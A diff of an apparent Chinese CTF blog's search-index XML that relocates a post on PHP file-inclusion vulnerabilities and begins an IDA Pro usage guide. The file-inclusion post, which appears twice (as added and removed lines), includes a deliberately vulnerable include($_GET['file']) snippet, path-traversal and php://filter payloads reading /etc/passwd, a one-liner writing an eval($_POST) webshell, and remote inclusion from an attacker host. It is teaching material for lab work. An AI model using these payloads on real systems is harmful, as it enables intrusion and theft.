@@ -546,6 +546,132 @@
       </tags>
   </entry>
   <entry>
+    <title>文件包含</title>
+    <url>//post/FileInclude/</url>
+    <content><![CDATA[<h2 id="文件包含漏洞的定义">文件包含漏洞的定义</h2>
+<p>​	文件包含漏洞（File Inclusion Vulnerability）是一种常见的安全漏洞，存在于许多Web应用程序中。它通常发生在应用程序未正确过滤用户提供的输入数据时。文件包含漏洞允许攻击者通过将恶意文件或远程资源包含到应用程序中的文件中，来执行未授权的操作。</p>
+<p>​	文件包含漏洞主要存在于动态网页应用程序中，特别是基于服务器端脚本语言（如PHP）的应用程序。它通常出现在开发人员使用用户提供的输入来构造文件路径、文件名或文件内容时。</p>
+<p>​	攻击者利用文件包含漏洞的常见方式之一是通过构造恶意URL，将恶意文件路径作为参数传递给应用程序。如果应用程序未正确验证和过滤该参数，攻击者可以通过指定恶意文件路径来包含任意文件，包括系统文件、应用程序文件或其他用户文件。这可能导致严重的安全问题，如远程代码执行、敏感信息泄露、服务器控制权被获取等。</p>
+<p>​	文件包含漏洞还可以利用远程文件包含（Remote File Inclusion）的方式。攻击者可以通过指定远程服务器上的恶意脚本或文件路径来利用漏洞。应用程序在处理远程文件包含时，未对其进行适当的验证和过滤，导致攻击者能够在目标服务器上执行任意代码。</p>
+<h2 id="文件包含的危害">文件包含的危害</h2>
+<ol>
+<li><strong>远程代码执行</strong>：攻击者可以通过文件包含漏洞注入恶意代码并执行，这可能导致服务器上的任意代码执行。攻击者可以执行恶意操作，如修改、删除、上传文件，控制服务器，访问敏感数据，甚至获取系统权限。</li>
+<li><strong>敏感信息泄露</strong>：通过文件包含漏洞，攻击者可以访问包含在应用程序中的敏感信息，例如数据库凭据、API密钥、密码文件等。这些信息可能被用于进一步的攻击或滥用。</li>
+<li><strong>服务器崩溃</strong>：攻击者可以通过构造恶意文件路径或远程资源来导致服务器过载或崩溃。这可能会导致服务不可用，影响业务连续性。</li>
+<li><strong>拒绝服务（DoS）攻击</strong>：攻击者可以通过频繁请求恶意文件来耗尽服务器资源，从而导致拒绝服务攻击。这会使合法用户无法正常访问应用程序。</li>
+<li><strong>操作系统命令执行</strong>：如果应用程序在文件包含过程中使用了用户提供的输入来构造操作系统命令，攻击者可以通过构造恶意输入来执行任意命令，从而控制服务器。</li>
+<li><strong>依赖文件篡改</strong>：攻击者可以篡改被包含的文件，例如修改配置文件、库文件或其他关键文件，以达到他们的目的。</li>
+</ol>
+<h2 id="文件包含漏洞常见函数">文件包含漏洞常见函数</h2>
+<ul>
+<li>代码：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>函数：</li>
+</ul>
+<ol>
+<li>
+<p><strong>include() 和 require()</strong>：</p>
+<p>这些函数用于将指定文件包含到当前脚本中。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，就可能存在文件包含漏洞。</p>
+</li>
+<li>
+<p><strong>include_once()</strong> 和 <strong>require_once()</strong>：</p>
+<p>类似于 include() 和 require()，但是它们确保同一个文件只被包含一次。文件包含漏洞可能仍然存在，如果恶意文件被成功包含，它将被执行一次。</p>
+</li>
+<li>
+<p><strong>eval()</strong>：</p>
+<p>这个函数用于执行包含在字符串中的 PHP 代码。如果字符串是基于用户输入构造的，并且没有进行适当的验证和过滤，可能导致远程代码执行漏洞。</p>
+</li>
+<li>
+<p><strong>file_get_contents()</strong>：</p>
+<p>这个函数用于读取文件的内容，并将其作为字符串返回。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
+</li>
+<li>
+<p><strong>readfile()</strong>：</p>
+<p>类似于 file_get_contents()，它用于将文件内容直接输出到浏览器。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
+</li>
+<li>
+<p><strong>get_template_part()</strong>：</p>
+<p>这个函数常用于WordPress主题开发，用于包含模板文件。如果模板文件的路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
+</li>
+</ol>
+<h2 id="模糊POC">模糊POC</h2>
+<p>文件包含漏洞的模糊POC（Proof of Concept）是一种用于测试应用程序是否存在文件包含漏洞的简单示例。它通常通过构造包含文件路径或资源的参数来尝试触发漏洞。以下是一个常见的文件包含漏洞的模糊POC示例：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://example.com/page.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>上述示例中的URL参数<code>file</code>用于指定要包含的文件路径。通过使用相对路径和父目录（<code>../</code>）来构造路径，攻击者试图访问<code>/etc/passwd</code>文件。如果应用程序未对输入进行适当的验证和过滤，可能会成功包含敏感文件，并将其内容返回给攻击者。</p>
+<p>其他例子：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#Linux</span><br><span class="line">?file=../../../etc/passwd</span><br><span class="line">?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">?file=../../../../windows/win.ini</span><br><span class="line">?file=c:/windows/win.ini</span><br></pre></td></tr></table></figure>
+<h2 id="伪协议：">伪协议：</h2>
+<p>在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。</p>
+<p><strong>allow_url_fopen</strong>:默认值是 ON。允许 url 里的封装协议访问文件；</p>
+<p><strong>allow_url_include</strong>:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p>
+<ol>
+<li><strong>file://</strong>：该伪协议用于指定本地文件系统中的文件路径。攻击者可以使用相对路径或绝对路径来指定要包含的文件，例如使用<code>file:///etc/passwd</code>来访问<code>/etc/passwd</code>文件。</li>
+<li><strong>http://</strong> 和 <strong>https://</strong>：这些伪协议用于指定远程文件或资源的URL。攻击者可以通过指定远程恶意脚本或文件路径来进行远程文件包含攻击，例如使用<code>http://attacker.com/malicious.php</code>来包含攻击者控制的远程文件。</li>
+<li><strong>data://</strong>：该伪协议用于将数据直接嵌入到URL中。攻击者可以将恶意代码或文件内容嵌入到URL中，然后通过文件包含漏洞将其包含到应用程序中。</li>
+<li><strong>php://</strong> 和 <strong>php://input</strong>：这些伪协议用于在PHP中进行特殊的文件操作。攻击者可以使用<code>php://filter</code>伪协议来执行各种操作，如读取文件内容、执行命令等。</li>
+<li><strong>expect://</strong>：该伪协议用于执行命令，通常在服务器上的某些环境中可用。攻击者可以通过构造恶意命令来执行操作。</li>
+<li><strong>zip://</strong>：zip伪协议用于指定包含在ZIP存档文件中的文件路径。攻击者可以构造一个恶意ZIP文件，其中包含恶意文件，并使用zip伪协议将其包含到应用程序中。</li>
+<li><strong>phar://</strong>：phar伪协议用于指定包含在PHAR存档文件中的文件路径。PHAR是一种自包含的PHP应用程序存档格式。攻击者可以构造一个恶意PHAR文件，其中包含恶意文件，并使用phar伪协议将其包含到应用程序中。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">协议</th>
+<th>条件</th>
+<th>Linux环境示例</th>
+<th>Window环境示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>file://——访问本地文件系统</strong></td>
+<td>allow_url_fopen:  off/on allow_url_include:  off/on</td>
+<td><a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt" >http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt<i class="fas fa-external-link-alt"></i></a>**</td>
+<td><a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt%EF%BC%88%E7%BB%9D%E5%AF%B9%E4%BD%8D%E7%BD%AE%EF%BC%89" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:\DVWA-master\vulnerabilities\fi\1.txt（绝对位置）<i class="fas fa-external-link-alt"></i></a>**</td>
+</tr>
+<tr>
+<td style="text-align:left">php://——访问各个输入流/输出流(I/O streams)。CTF中常用以下两个。①<strong>php://input</strong>：将POST输入流当做PHP代码执行。②<strong>php://filter</strong>：是一种元封装器，作用是作为一个“中间流”来处理其他流。</td>
+<td>①<strong>php://input</strong>：allow_url_fopen:  off/on allow_url_include:  on          ②<strong>php://filter</strong>：allow_url_fopen:  off/on allow_url_include:  off/on</td>
+<td>① <a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post" >http://127.0.0.1/FI/LFI.php?file=**php://input**Post<i class="fas fa-external-link-alt"></i></a> Data：<strong>需要执行的木马</strong>②(1)<a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt" >http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt<i class="fas fa-external-link-alt"></i></a>**  #相对位置(3)<a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd" >http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd<i class="fas fa-external-link-alt"></i></a>**</td>
+<td>① <a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post" >http://127.0.0.1/FI/LFI.php?file=**php://input**Post<i class="fas fa-external-link-alt"></i></a> Data：需要执行的木马②<a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt<i class="fas fa-external-link-alt"></i></a>**  #php：//filter作为中间流处理绝对位置</td>
+</tr>
+<tr>
+<td style="text-align:left">data://——数据（RFC 2397）</td>
+<td>allow_url_fopen: on/off  allow_url_include:  on</td>
+<td>2种用法（和php://input一样执行木马。<strong><?php**  **fputs(fopen(‘shell.php’,’w’),”<?php @eval($_POST[x]);?>”)?&gt;<strong>可生成木马在同一目录）①</strong>data://text/plain，木马</strong><a class="link"   href="http://127.0.0.1/include.php?file=**data://text/plain," >http://127.0.0.1/include.php?file=**data://text/plain,<i class="fas fa-external-link-alt"></i></a><?php%20phpinfo();?><strong>②</strong>data://text/plain;base64，64位木马<strong><a class="link"   href="http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b" >http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B<i class="fas fa-external-link-alt"></i></a></strong></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">http:// &amp; https://——常规URL形式，允许通过HTTP 1.0的GET方法，以只读的身份访问文件和资源。常用于远程包含。</td>
+<td>allow_url_fopen: on allow_url_include:  on</td>
+<td>方法与window的②类似</td>
+<td>①端口开启http服务监听。Win+R，cmd命令行输入：<strong>python -m</strong>  <strong>SimpleHTTPServer 端口号</strong>② <a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:%E7%AB%AF%E5%8F%A3%E5%8F%B7/desktop/shell.jpg%EF%BC%88%E5%8C%85%E5%90%ABphp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:端口号/desktop/shell.jpg（包含php一句话木马的图片马）<i class="fas fa-external-link-alt"></i></a>**</td>
+</tr>
+<tr>
+<td style="text-align:left">zip:// &amp;  bzip2:// &amp; zlib:// ——均属于压缩流，可以访问压缩文件的所有子文件(无论任意后缀，如jpg/php/png/xxx)</td>
+<td>allow_url_fopen: on/off allow_url_include:  on/off</td>
+<td>略</td>
+<td>①<strong>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</strong>（在windows测试下，5.3.0&lt;php版本&lt;5.4，且#编码为%23）。例子，压缩phpinfo.txt为phpinfo.zip，压缩包重命名为phpinfo.jpg，并上传。<a class="link"   href="http://127.0.0.1/include.php?file=**zip://C:%5Cdesktop%5Cphpinfo.jpg%23phpinfo.txt" >http://127.0.0.1/include.php?file=**zip://C:\desktop\phpinfo.jpg%23phpinfo.txt<i class="fas fa-external-link-alt"></i></a>** ②<strong>compress.bzip2://FilePath(绝对路径)/filename.bz2</strong>    压缩phpinfo.txt为phpinfo.bz2并上传（同样支持任意后缀名）<a class="link"   href="http://127.0.0.1/include.php?file=**compress.bzip2://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.bz2" >http://127.0.0.1/include.php?file=**compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<i class="fas fa-external-link-alt"></i></a>** ③<strong>compress.zlib://file.gz</strong>     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）<a class="link"   href="http://127.0.0.1/include.php?file=**compress.zlib://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.gz" >http://127.0.0.1/include.php?file=**compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz<i class="fas fa-external-link-alt"></i></a>**</td>
+</tr>
+<tr>
+<td style="text-align:left">phar://——与zip://协议类似，同样可以可以访问zip格式压缩包内容。（php版本&gt;5.3.0）</td>
+<td>allow_url_fopen: on/off allow_url_include:  on</td>
+<td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a class="link"   href="http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php" >http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php<i class="fas fa-external-link-alt"></i></a>**  #相对位置</td>
+<td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a class="link"   href="http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:%5CUsers%5CCISP-PTE%5CDesktop%5C22.png%5C22.jpg" >http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:\Users\CISP-PTE\Desktop\22.png\22.jpg<i class="fas fa-external-link-alt"></i></a>**  #绝对位置</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传</title>
     <url>//post/FileUpload/</url>
     <content><![CDATA[<h2 id="任意文件上传漏洞的概念和危害">任意文件上传漏洞的概念和危害</h2>
@@ -917,129 +1043,73 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含</title>
-    <url>//post/FileInclude/</url>
-    <content><![CDATA[<h2 id="文件包含漏洞的定义">文件包含漏洞的定义</h2>
-<p>​	文件包含漏洞（File Inclusion Vulnerability）是一种常见的安全漏洞，存在于许多Web应用程序中。它通常发生在应用程序未正确过滤用户提供的输入数据时。文件包含漏洞允许攻击者通过将恶意文件或远程资源包含到应用程序中的文件中，来执行未授权的操作。</p>
-<p>​	文件包含漏洞主要存在于动态网页应用程序中，特别是基于服务器端脚本语言（如PHP）的应用程序。它通常出现在开发人员使用用户提供的输入来构造文件路径、文件名或文件内容时。</p>
-<p>​	攻击者利用文件包含漏洞的常见方式之一是通过构造恶意URL，将恶意文件路径作为参数传递给应用程序。如果应用程序未正确验证和过滤该参数，攻击者可以通过指定恶意文件路径来包含任意文件，包括系统文件、应用程序文件或其他用户文件。这可能导致严重的安全问题，如远程代码执行、敏感信息泄露、服务器控制权被获取等。</p>
-<p>​	文件包含漏洞还可以利用远程文件包含（Remote File Inclusion）的方式。攻击者可以通过指定远程服务器上的恶意脚本或文件路径来利用漏洞。应用程序在处理远程文件包含时，未对其进行适当的验证和过滤，导致攻击者能够在目标服务器上执行任意代码。</p>
-<h2 id="文件包含的危害">文件包含的危害</h2>
-<ol>
-<li><strong>远程代码执行</strong>：攻击者可以通过文件包含漏洞注入恶意代码并执行，这可能导致服务器上的任意代码执行。攻击者可以执行恶意操作，如修改、删除、上传文件，控制服务器，访问敏感数据，甚至获取系统权限。</li>
-<li><strong>敏感信息泄露</strong>：通过文件包含漏洞，攻击者可以访问包含在应用程序中的敏感信息，例如数据库凭据、API密钥、密码文件等。这些信息可能被用于进一步的攻击或滥用。</li>
-<li><strong>服务器崩溃</strong>：攻击者可以通过构造恶意文件路径或远程资源来导致服务器过载或崩溃。这可能会导致服务不可用，影响业务连续性。</li>
-<li><strong>拒绝服务（DoS）攻击</strong>：攻击者可以通过频繁请求恶意文件来耗尽服务器资源，从而导致拒绝服务攻击。这会使合法用户无法正常访问应用程序。</li>
-<li><strong>操作系统命令执行</strong>：如果应用程序在文件包含过程中使用了用户提供的输入来构造操作系统命令，攻击者可以通过构造恶意输入来执行任意命令，从而控制服务器。</li>
-<li><strong>依赖文件篡改</strong>：攻击者可以篡改被包含的文件，例如修改配置文件、库文件或其他关键文件，以达到他们的目的。</li>
-</ol>
-<h2 id="文件包含漏洞常见函数">文件包含漏洞常见函数</h2>
+    <title>IDA使用指南</title>
+    <url>//post/IDAuse/</url>
+    <content><![CDATA[<h3 id="IDA-Pro基本用法">IDA Pro基本用法</h3>
+<p>IDA Pro 通常会提供 <code>ida.exe</code> 与 <code>ida64.exe</code> 两个可执行程序，分别对应于逆向 <code>32</code> 位与 <code>64</code> 位程序。当我们需要使用 IDA Pro 分析某一可执行程序二进制文件时，我们需要根据程序指令集长度的不同选择使用不同的 <code>ida</code> 。</p>
+<p>最简单的使用方式是将待逆向的二进制可执行文件直接拖放到 IDA 上，IDA 会自动识别文件类型，这一步通常不需要做改动，直接点击 OK 即可</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_load.png"
+                        alt="ida_load"
+                 ></p>
+<p>接下来我们就会看到这样一个界面：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_ui.png"
+                        alt="ida_ui"
+                 ></p>
 <ul>
-<li>代码：</li>
+<li><code>Function Windows</code> ：IDA 所识别出来的函数列表，通过该目录可以直接跳转到对应函数</li>
+<li><code>IDA-View</code> ：以汇编形式呈现的由 IDA 进行反编译所得的单个函数结果，默认是以由基本块构成的控制流图的形式进行展示，也可以通过 <code>空格</code> 键切换到内存布局中的原始汇编代码</li>
+<li><code>Hex View</code> ： 二进制文件的原始数据视图</li>
+<li><code>Structures</code> ：由 IDA 所识别出来的程序中可能存在的结构体信息</li>
+<li><code>Enums</code> ：由 IDA 所识别出来的程序中可能存在的枚举信息</li>
+<li><code>Imports</code> ： 该二进制文件运行时可能需要从外部导入的符号</li>
+<li><code>Exports</code> ： 该二进制文件可以被导出到外部的符号</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>函数：</li>
-</ul>
-<ol>
-<li>
-<p><strong>include() 和 require()</strong>：</p>
-<p>这些函数用于将指定文件包含到当前脚本中。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，就可能存在文件包含漏洞。</p>
-</li>
-<li>
-<p><strong>include_once()</strong> 和 <strong>require_once()</strong>：</p>
-<p>类似于 include() 和 require()，但是它们确保同一个文件只被包含一次。文件包含漏洞可能仍然存在，如果恶意文件被成功包含，它将被执行一次。</p>
-</li>
-<li>
-<p><strong>eval()</strong>：</p>
-<p>这个函数用于执行包含在字符串中的 PHP 代码。如果字符串是基于用户输入构造的，并且没有进行适当的验证和过滤，可能导致远程代码执行漏洞。</p>
-</li>
-<li>
-<p><strong>file_get_contents()</strong>：</p>
-<p>这个函数用于读取文件的内容，并将其作为字符串返回。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
-</li>
-<li>
-<p><strong>readfile()</strong>：</p>
-<p>类似于 file_get_contents()，它用于将文件内容直接输出到浏览器。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
-</li>
-<li>
-<p><strong>get_template_part()</strong>：</p>
-<p>这个函数常用于WordPress主题开发，用于包含模板文件。如果模板文件的路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p>
-</li>
-</ol>
-<h2 id="模糊POC">模糊POC</h2>
-<p>文件包含漏洞的模糊POC（Proof of Concept）是一种用于测试应用程序是否存在文件包含漏洞的简单示例。它通常通过构造包含文件路径或资源的参数来尝试触发漏洞。以下是一个常见的文件包含漏洞的模糊POC示例：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://example.com/page.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>上述示例中的URL参数<code>file</code>用于指定要包含的文件路径。通过使用相对路径和父目录（<code>../</code>）来构造路径，攻击者试图访问<code>/etc/passwd</code>文件。如果应用程序未对输入进行适当的验证和过滤，可能会成功包含敏感文件，并将其内容返回给攻击者。</p>
-<p>其他例子：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#Linux</span><br><span class="line">?file=../../../etc/passwd</span><br><span class="line">?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">?file=../../../../windows/win.ini</span><br><span class="line">?file=c:/windows/win.ini</span><br></pre></td></tr></table></figure>
-<h2 id="伪协议：">伪协议：</h2>
-<p>在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。</p>
-<p><strong>allow_url_fopen</strong>:默认值是 ON。允许 url 里的封装协议访问文件；</p>
-<p><strong>allow_url_include</strong>:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p>
-<ol>
-<li><strong>file://</strong>：该伪协议用于指定本地文件系统中的文件路径。攻击者可以使用相对路径或绝对路径来指定要包含的文件，例如使用<code>file:///etc/passwd</code>来访问<code>/etc/passwd</code>文件。</li>
-<li><strong>http://</strong> 和 <strong>https://</strong>：这些伪协议用于指定远程文件或资源的URL。攻击者可以通过指定远程恶意脚本或文件路径来进行远程文件包含攻击，例如使用<code>http://attacker.com/malicious.php</code>来包含攻击者控制的远程文件。</li>
-<li><strong>data://</strong>：该伪协议用于将数据直接嵌入到URL中。攻击者可以将恶意代码或文件内容嵌入到URL中，然后通过文件包含漏洞将其包含到应用程序中。</li>
-<li><strong>php://</strong> 和 <strong>php://input</strong>：这些伪协议用于在PHP中进行特殊的文件操作。攻击者可以使用<code>php://filter</code>伪协议来执行各种操作，如读取文件内容、执行命令等。</li>
-<li><strong>expect://</strong>：该伪协议用于执行命令，通常在服务器上的某些环境中可用。攻击者可以通过构造恶意命令来执行操作。</li>
-<li><strong>zip://</strong>：zip伪协议用于指定包含在ZIP存档文件中的文件路径。攻击者可以构造一个恶意ZIP文件，其中包含恶意文件，并使用zip伪协议将其包含到应用程序中。</li>
-<li><strong>phar://</strong>：phar伪协议用于指定包含在PHAR存档文件中的文件路径。PHAR是一种自包含的PHP应用程序存档格式。攻击者可以构造一个恶意PHAR文件，其中包含恶意文件，并使用phar伪协议将其包含到应用程序中。</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">协议</th>
-<th>条件</th>
-<th>Linux环境示例</th>
-<th>Window环境示例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left"><strong>file://——访问本地文件系统</strong></td>
-<td>allow_url_fopen:  off/on allow_url_include:  off/on</td>
-<td><a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt" >http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt<i class="fas fa-external-link-alt"></i></a>**</td>
-<td><a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt%EF%BC%88%E7%BB%9D%E5%AF%B9%E4%BD%8D%E7%BD%AE%EF%BC%89" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:\DVWA-master\vulnerabilities\fi\1.txt（绝对位置）<i class="fas fa-external-link-alt"></i></a>**</td>
-</tr>
-<tr>
-<td style="text-align:left">php://——访问各个输入流/输出流(I/O streams)。CTF中常用以下两个。①<strong>php://input</strong>：将POST输入流当做PHP代码执行。②<strong>php://filter</strong>：是一种元封装器，作用是作为一个“中间流”来处理其他流。</td>
-<td>①<strong>php://input</strong>：allow_url_fopen:  off/on allow_url_include:  on          ②<strong>php://filter</strong>：allow_url_fopen:  off/on allow_url_include:  off/on</td>
-<td>① <a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post" >http://127.0.0.1/FI/LFI.php?file=**php://input**Post<i class="fas fa-external-link-alt"></i></a> Data：<strong>需要执行的木马</strong>②(1)<a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt" >http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt<i class="fas fa-external-link-alt"></i></a>**  #相对位置(3)<a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd" >http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd<i class="fas fa-external-link-alt"></i></a>**</td>
-<td>① <a class="link"   href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post" >http://127.0.0.1/FI/LFI.php?file=**php://input**Post<i class="fas fa-external-link-alt"></i></a> Data：需要执行的木马②<a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt<i class="fas fa-external-link-alt"></i></a>**  #php：//filter作为中间流处理绝对位置</td>
-</tr>
-<tr>
-<td style="text-align:left">data://——数据（RFC 2397）</td>
-<td>allow_url_fopen: on/off  allow_url_include:  on</td>
-<td>2种用法（和php://input一样执行木马。<strong><?php**  **fputs(fopen(‘shell.php’,’w’),”<?php @eval($_POST[x]);?>”)?&gt;<strong>可生成木马在同一目录）①</strong>data://text/plain，木马</strong><a class="link"   href="http://127.0.0.1/include.php?file=**data://text/plain," >http://127.0.0.1/include.php?file=**data://text/plain,<i class="fas fa-external-link-alt"></i></a><?php%20phpinfo();?><strong>②</strong>data://text/plain;base64，64位木马<strong><a class="link"   href="http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b" >http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B<i class="fas fa-external-link-alt"></i></a></strong></td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:left">http:// &amp; https://——常规URL形式，允许通过HTTP 1.0的GET方法，以只读的身份访问文件和资源。常用于远程包含。</td>
-<td>allow_url_fopen: on allow_url_include:  on</td>
-<td>方法与window的②类似</td>
-<td>①端口开启http服务监听。Win+R，cmd命令行输入：<strong>python -m</strong>  <strong>SimpleHTTPServer 端口号</strong>② <a class="link"   href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:%E7%AB%AF%E5%8F%A3%E5%8F%B7/desktop/shell.jpg%EF%BC%88%E5%8C%85%E5%90%ABphp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89" >http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:端口号/desktop/shell.jpg（包含php一句话木马的图片马）<i class="fas fa-external-link-alt"></i></a>**</td>
-</tr>
-<tr>
-<td style="text-align:left">zip:// &amp;  bzip2:// &amp; zlib:// ——均属于压缩流，可以访问压缩文件的所有子文件(无论任意后缀，如jpg/php/png/xxx)</td>
-<td>allow_url_fopen: on/off allow_url_include:  on/off</td>
-<td>略</td>
